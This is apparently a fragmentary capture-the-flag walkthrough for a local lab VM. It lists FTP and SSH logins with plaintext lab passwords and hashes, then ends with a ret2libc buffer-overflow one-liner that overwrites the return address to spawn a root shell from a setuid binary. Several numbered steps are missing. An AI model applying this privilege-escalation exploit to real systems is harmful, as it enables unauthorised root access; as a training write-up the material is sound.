7. Install additional tool inetutils to use some internet protocol:
	a) brew install inetutils
	b) Use ftp protocol to connect with our VirtualBox using ip: 192.168.56.101;
	c) Execute:
		ftp 192.168.56.101
	d) Login: lmezard , then use password: G!@M6f4Eatau{sF"

 		tar -xf fun -C FunOutput
 	c) go to the directory with output:
 		cd FunOutput
 	d) see new ft_fun folder from the archive;
	e) In ft_fun folder placed parts with C code, which sould be concatenated and compiled.
	   Use custom JS script to build the final main.c file.
			node packer_main.js FunOutput/ft_fun
	f) The output will be some password;
	g) Use sha256 generator to hash the password, result: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

9. Get access to ssh connection with VM:
	a) Connect via ssh protocol with the user name:
		ssh laurie@192.168.56.101

		scp thor@192.168.56.101:README .
	d) In README find for new username 'zaz';
	e) Open "turtle" file, there are some commands;
	f) Execute custom script that could paint it:
		python3 TurtleCommandsPainter.py
	g) The phrase is "SLASH", to hash it using md5 and get password "646da671ca01bb5d84dbb5fb2238dc8e".

12. Connect to "zaz" user with password "646da671ca01bb5d84dbb5fb2238dc8e" via ssh:

	b) There are file "exploit_me" and "mail" directory;
	c) Find out about ret2libc attack in google;
	d) Since "exploit_me" is a root file, spwan root shell using ret2libc attack.
	Use gdb to find for address of system function and "/bin/bash" string:
	e) Overwrite the %eip register with the system address from libc;
	f) Put "/bin/sh" address on the stack at %eip+8:
		./exploit_me $(python -c "print('.'*140 + '\xb7\xe6\xb0\x60'[::-1] + 'ALEX' + '\xb7\xf8\xcc\x58'[::-1])")
